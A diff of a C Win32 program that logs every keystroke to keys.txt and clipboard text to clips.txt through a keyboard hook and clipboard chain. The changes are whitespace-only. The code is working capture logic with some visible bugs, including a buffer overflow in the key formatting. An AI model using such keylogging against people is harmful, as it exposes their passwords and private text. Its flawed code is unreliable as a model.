@@ -26,7 +26,7 @@ LRESULT PaintCtrl(WPARAM wParam) {
 void BeforeClose(HWND hWnd, HHOOK hHook) {
     ChangeClipboardChain(hWnd, NULL);
     UnhookWindowsHookEx(hHook);
-    PostQuitMessage(0);    
+    PostQuitMessage(0);
 }
 
 void ProcessCheck(HWND hWnd, WPARAM wParam, HHOOK* phHook, LRESULT (*pKeyProc)(INT, WPARAM, LPARAM)) {
@@ -41,6 +41,7 @@ void ProcessCheck(HWND hWnd, WPARAM wParam, HHOOK* phHook, LRESULT (*pKeyProc)(I
                 ChangeClipboardChain(hWnd, NULL);
             }
             break;
+
        case KEY:
            if(IsDlgButtonChecked(hWnd, KEY) == BST_UNCHECKED) {
                CheckDlgButton(hWnd, KEY, BST_CHECKED);
@@ -57,11 +58,13 @@ void ProcessCheck(HWND hWnd, WPARAM wParam, HHOOK* phHook, LRESULT (*pKeyProc)(I
 void WriteDateTime(HANDLE hFile) {
     SYSTEMTIME st;
     GetLocalTime(&st);
+
     INT dateSize = GetDateFormat(LOCALE_USER_DEFAULT, 0, &st, NULL, NULL, 0);
     TCHAR date[dateSize];
     GetDateFormat(LOCALE_SYSTEM_DEFAULT, 0, &st, NULL, date, dateSize);
     INT timeSize = GetTimeFormat(LOCALE_USER_DEFAULT, 0, &st, NULL, NULL, 0);
     TCHAR time[timeSize];
+
     GetTimeFormat(LOCALE_SYSTEM_DEFAULT, 0, &st, NULL, time, timeSize);
     WriteFile(hFile, date, dateSize - 1, NULL, NULL);
     WriteFile(hFile, " ", 1, NULL, NULL);
@@ -71,15 +74,19 @@ void WriteDateTime(HANDLE hFile) {
 
 void ClipProc(HWND hWnd) {
     if(!OpenClipboard(hWnd)) return;
+
     HANDLE clipData = GetClipboardData(CF_UNICODETEXT);
     if(!clipData) return;
+
     LPCWSTR wideClipText = (LPCWSTR) GlobalLock(clipData);
     GlobalUnlock(clipData);
     CloseClipboard();
     if(!wideClipText) return;
+
     INT clipTextSize = WideCharToMultiByte(CP_UTF8, 0, wideClipText, -1, NULL, 0, NULL, NULL);
     TCHAR clipText[clipTextSize];
     WideCharToMultiByte(CP_UTF8, 0, wideClipText, -1, clipText, clipTextSize, NULL, NULL);
+
     HANDLE hFile = CreateFile("clips.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     WriteDateTime(hFile);
     WriteFile(hFile, newLine, 2, NULL, NULL);
@@ -93,15 +100,18 @@ LRESULT CALLBACK KeyProc(INT nCode, WPARAM wParam, LPARAM lParam) {
     if(wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
         PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) lParam;
         DWORD key = p->vkCode;
+
         UINT mapped = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
         UINT ch = mapped != 0 ? mapped : key;
         TCHAR hex[8];
         sprintf(hex, "0x%02X '%c'", key, ch);
+
         HANDLE hFile = CreateFile("keys.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
         WriteDateTime(hFile);
         WriteFile(hFile, hex, 8, NULL, NULL);
         WriteFile(hFile, newLine, 2, NULL, NULL);
         CloseHandle(hFile);
     }
+
     return 0;
 }
